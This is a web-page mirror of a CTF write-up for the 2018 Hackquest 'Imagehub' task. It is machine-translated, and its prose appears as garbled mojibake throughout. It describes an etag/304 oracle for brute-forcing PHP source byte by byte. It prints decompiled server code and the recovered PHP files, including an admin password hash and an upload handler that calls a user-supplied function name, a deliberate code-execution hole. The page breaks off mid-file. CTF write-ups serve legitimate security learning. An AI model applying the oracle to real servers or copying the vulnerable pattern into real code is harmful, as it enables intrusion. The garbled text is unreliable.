<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ•´ğŸ» ğŸ¾ ğŸ¾ Hackquest2018ã€‚ç»“æœä¸å†™ä½œã€‚ ç¬¬4-7å¤© ğŸ¥¦ ğŸ¿ â²ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="æŒ‰ç…§æ‰¿è¯ºï¼Œæˆ‘ä»¬å°†å‘å¸ƒå¹´åº¦hackquestå†³ç­–çš„ç¬¬äºŒéƒ¨åˆ†ã€‚ ç¬¬4-7å¤©ï¼šç´§å¼ åŠ å‰§ï¼Œä»»åŠ¡å˜å¾—æ›´åŠ æœ‰è¶£ï¼ 


 å†…å®¹ï¼š 


- ç¬¬4å¤© å›¾ç‰‡é›†çº¿å™¨ 
- ç¬¬5å¤© æ—¶é—´ 
- ç¬¬6å¤© å¾ˆæ£’çš„è™šæ‹Ÿæœº 
- ç¬¬7å¤©ã€‚ éšè—èµ„æº 

 ç¬¬4å¤© å›¾ç‰‡é›†çº¿å™¨ 
 æ­¤ä»»åŠ¡ç”±SPbCTFå‡†å¤‡ã€‚ 

 æˆ‘ä»¬çš„æ–°ä½œå“å°†...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest2018ã€‚ç»“æœä¸å†™ä½œã€‚ ç¬¬4-7å¤©</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/"> æŒ‰ç…§æ‰¿è¯ºï¼Œæˆ‘ä»¬å°†å‘å¸ƒå¹´åº¦hackquestå†³ç­–çš„ç¬¬äºŒéƒ¨åˆ†ã€‚ ç¬¬4-7å¤©ï¼šç´§å¼ åŠ å‰§ï¼Œä»»åŠ¡å˜å¾—æ›´åŠ æœ‰è¶£ï¼ <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2> å†…å®¹ï¼š </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬4å¤©</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å›¾ç‰‡é›†çº¿å™¨</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬5å¤©</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ—¶é—´</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬6å¤©</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å¾ˆæ£’çš„è™šæ‹Ÿæœº</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬7å¤©ã€‚</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">éšè—èµ„æº</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a> ç¬¬4å¤© å›¾ç‰‡é›†çº¿å™¨ </h2><br> æ­¤ä»»åŠ¡ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SPbCTF</a>å‡†å¤‡ã€‚ <br><br>  <i>æˆ‘ä»¬çš„æ–°ä½œå“å°†æ€æ­»Instagramã€‚</i>  <i>æˆ‘ä»¬ä»…ç”¨ä¸¤ä¸ªå­—å°±èƒ½è¯´æœæ‚¨ï¼š</i> <i><br><br></i>  <i>1.è¿‡æ»¤å™¨ã€‚</i>  <i>æ–°çš„å‰æ‰€æœªæœ‰çš„è¿‡æ»¤å™¨ï¼Œç”¨äºæ‚¨ä¸Šä¼ çš„å›¾ç‰‡ã€‚</i> <i><br></i>  <i>2.ç¼“å­˜ã€‚</i>  <i>è‡ªå®šä¹‰HTTPæœåŠ¡å™¨å¯ç¡®ä¿å›¾åƒæ–‡ä»¶ä½äºæµè§ˆå™¨ç¼“å­˜ä¸­ã€‚</i> <i><br><br></i>  <i>ç«‹å³å°è¯•ï¼</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>è¿è¡Œ/ get_the_flagèµ¢ã€‚</i> <i><br></i>  <i>è‡ªå®šä¹‰æœåŠ¡å™¨äºŒè¿›åˆ¶æ–‡ä»¶ï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">dppth</a></i> <br><br>  <b>æç¤º</b> <br>  <i><b>10/25/2018 20:00</b></i> <i><br></i>  <i>ä»»åŠ¡æ²¡æœ‰è§£å†³ã€‚</i>  <i>æ·»åŠ äº†24å°æ—¶ã€‚</i> <i><br><br></i>  <i><b>10/25/2018 17:00</b></i> <i><br></i>  <i>æˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªé”™è¯¯ã€‚</i>  <i>ç¬¬ä¸€ä¸ªè®©æ‚¨è·å¾—Webåº”ç”¨ç¨‹åºæºï¼Œç¬¬äºŒä¸ªè®©æ‚¨è·å¾—RCEã€‚</i> <br><br><h4> æ¦‚è¿°ï¼š </h4><br> å¯æ‰§è¡Œæ–‡ä»¶ï¼š <br><br><ul><li> ç²¾çµx86_64 </li><li> å®ç°ç®€å•çš„httpæœåŠ¡å™¨ </li><li> å¦‚æœè¯·æ±‚çš„æ–‡ä»¶å…·æœ‰å¯æ‰§è¡Œä½ï¼Œåˆ™å°†å…¶ä¼ é€’ç»™php-fpm </li><li> ä»£ç å®ç°è‡ªå®šä¹‰etagç¼“å­˜ </li></ul><br> ç½‘é¡µéƒ¨åˆ†ï¼š <br><br><ul><li> å…·æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚ å¯ä»¥ä½¿ç”¨é¢„å®šä¹‰çš„æ»¤é•œä¿®æ”¹å›¾åƒã€‚ </li><li> åœ¨/ï¼ŸAdmin = showä¸Šå…·æœ‰Basicçš„ç®¡ç†é¡µé¢ </li></ul><br><h4> æ¼æ´ï¼šè¯»å–æºä»£ç  </h4><br> ç¼“å­˜åŠŸèƒ½ä¼¼ä¹å¾ˆæœ‰è¶£ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥è®©æœåŠ¡å™¨å¯¹æ–‡ä»¶çš„ä»»æ„èŒƒå›´è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼ˆç”šè‡³1ä¸ªå­—èŠ‚èŒƒå›´ï¼‰ã€‚ <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">å“ˆå¸Œå‡½æ•°ï¼š</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br> ä¸å¹¸çš„æ˜¯ï¼Œetagè¢«å‰¥å¤ºäº†å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ* .phpï¼‰ï¼š <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br> é¡µé¢æ‰§è¡Œä¹‹å‰ä»ç„¶éœ€è¦è¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æ­£ç¡®åœ°çŒœæµ‹etagå€¼ï¼ˆ <b>if-none-match</b> ï¼‰ï¼Œåˆ™æœåŠ¡å™¨å°†å‘æˆ‘ä»¬æä¾›<b>304æœªä¿®æ”¹</b>çŠ¶æ€å“åº”ã€‚ ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€å­—èŠ‚é€ä¸ªæš´åŠ›ç ´è§£æºä»£ç ã€‚ <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br> è®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬ä»REä¸­è·å¾—çš„æ”¶ç›Šï¼š <br><br><ol><li> ä»ä¸Šæ¬¡ä¿®æ”¹çš„å“åº”æ ‡å¤´ï¼ˆå­—ç¬¦ä¸²-&gt;æ—¶é—´æˆ³ï¼‰å¯ä»¥è½»æ¾è¯»å–æ—¶é—´æˆ³ã€‚ </li><li> èŒƒå›´å…è®¸ä¸ºä¸€ä¸ªå­—èŠ‚é•¿åº¦ï¼ˆå› æ­¤æˆ‘ä»¬å°†ä»…è·å¾—ä¸€ä¸ªå­—èŠ‚çš„å“ˆå¸Œå€¼ï¼‰ </li><li> å¯ä»¥çŒœæµ‹1ä¸ªå­—èŠ‚èŒƒå›´å†…çš„å“ˆå¸Œå€¼ï¼ˆ256ä¸ªå¯èƒ½çš„å€¼ï¼‰ </li><li> å¤§å°å¯ä»¥å¼ºåˆ¶æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦ä»ç›®æ ‡æ–‡ä»¶ä¸­è‡³å°‘çŸ¥é“ä¸€ä¸ªå­—èŠ‚ã€‚ </li><li> ç”±äºæˆ‘ä»¬å¸Œæœ›è·å–* .phpæ–‡ä»¶çš„æºä»£ç ï¼Œå› æ­¤å¯ä»¥å¾ˆå¥½åœ°å‡è®¾è¯¥æ–‡ä»¶ä»¥â€œ &lt;ï¼ŸPhpâ€å¼€å¤´ã€‚ </li></ol><br> ç¬¬ä¸€æ­¥æ˜¯è·å–å¤§å°ï¼Œç¬¬äºŒæ­¥æ˜¯è·å–å®é™…æ–‡ä»¶å†…å®¹ã€‚ <br> ä½¿ç”¨å¤šçº¿ç¨‹ä»£ç ï¼Œæˆ‘è¾¾åˆ°äº†ã€œ1ä¸ªå­—ç¬¦/ç§’çš„é€Ÿåº¦ï¼Œå¹¶è½¬å‚¨äº†ä¸€äº›æ–‡ä»¶ï¼š <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">åŒ…æ‹¬/filters.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">åŒ…æ‹¬/ uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> 